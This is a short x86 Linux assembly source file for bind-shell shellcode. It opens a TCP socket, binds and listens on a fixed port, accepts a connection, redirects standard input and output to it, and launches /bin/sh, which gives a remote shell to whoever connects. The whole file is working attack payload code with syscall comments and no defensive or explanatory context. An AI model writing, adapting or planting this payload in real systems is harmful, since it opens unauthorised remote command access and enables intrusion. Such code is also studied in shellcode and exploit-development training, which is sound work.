global _start
section .text
_start:
  ; Create our socket
  ; socket(AF_INET, SOCK_STREAM, 0)
  ;
  xor ebx, ebx
  mov bl, 0x01
 
  xor edx, edx
  xor ecx, ecx
 
  push edx
  push ebx
  push byte 0x02
  mov ecx, esp
 
  xor eax, eax
  mov al, 0x66
  int 0x80
  xchg esi, eax
 
  ; Bind our socket
  ; addr.sin_family = AF_INET;
  ; addr.sin_port = htons(port);
  ; addr.sin_addr.s_addr = INADDR_ANY;
  ; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
  ;
  inc ebx
  push edx
  push word 0x697A
  push bx
  mov ecx, esp
 
  push byte 0x10
  push ecx
  push esi
  mov ecx, esp
  mov al, 0x66
  int 0x80
 
  ; Listen
  ; listen(sockfd, 0);
  ;
  push edx
  inc ebx
  inc ebx
  push ebx
  push esi
 
  mov ecx, esp
  mov al, 0x66
  int 0x80
 
  ; Accept
  ; accept(sockfd, NULL, NULL)
  inc ebx
 
  push edx
  push edx
  push esi
  mov ecx, esp
  mov al, 0x66
  int 0x80
  xchg ebx, eax
 
  ; Dup2
  ; dup2(clientfd, 0)
  ; dup2(clientfd, 1)
  ; dup2(clientfd, 2)
  xor ecx, ecx
dup:
  mov al, 0x3f
  int 0x80
  inc ecx
  cmp ecx, 0x3
  jne dup
 
  ; Execve
  ; execve("/bin/sh", NULL, NULL)
  ;
  push edx
  push 0x68732f2f
  push 0x6e69622f
 
  mov ebx, esp
  mov ecx, edx
 
  mov al, 0x0b
  int 0x80